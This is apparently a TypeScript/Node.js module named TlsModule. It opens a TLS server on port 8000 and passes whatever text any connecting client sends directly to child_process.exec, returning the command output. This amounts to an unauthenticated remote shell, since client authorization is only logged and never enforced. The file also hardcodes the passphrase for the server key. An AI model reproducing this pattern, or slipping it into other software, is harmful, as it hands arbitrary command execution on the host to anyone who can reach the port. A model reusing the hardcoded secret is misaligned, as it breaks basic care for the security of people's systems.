const tls = require("tls");
const fs = require("fs");
const exec = require('child_process').exec;

import {LogUtil} from "../util/LogUtil";

export class TlsModule{
    
    private static TAG = "TlsModule";
    
    constructor(){
        LogUtil.info(TlsModule.TAG, "constructor");
        return;
    }
    
    start = () => {
        
        const options = {
            // These are necessary only if using the client certificate authentication
            key: fs.readFileSync(__dirname + '/../../resource/koacert/server.key'),
            cert: fs.readFileSync(__dirname + '/../../resource/koacert/server.crt'),
            passphrase: "QnTIhMq13ktKZosYtNRZ7X9kI96QgUHEvyyHJ8hlrigzJLUqYq"
            // This is necessary only if the server uses the self-signed certificate
        //   ca: [ fs.readFileSync('server-cert.pem') ]
        };

        var server = tls.createServer(options, (socket:any) => {
            
            console.log('server connected',
                        socket.authorized ? 'authorized' : 'unauthorized');
            socket.write('welcome!\n');
            socket.setEncoding('utf8');
            
            var options = {
                encoding: 'utf8',
                timeout: 0,
                maxBuffer: 200*1024,
                killSignal: 'SIGTERM',
                cwd: "/home"
            }
            socket.on("data", function(data:any){
                    const child = exec(data,　options,
                    (error:Error, stdout:string, stderr:string) => {
                        socket.write(stdout);
                        if (error !== null) {
                            console.log(`exec error: ${error}`);
                        }
                    });
        })
        
        });
        server.listen(8000, () => {
            console.log('server bound');
        });
    }
    
}
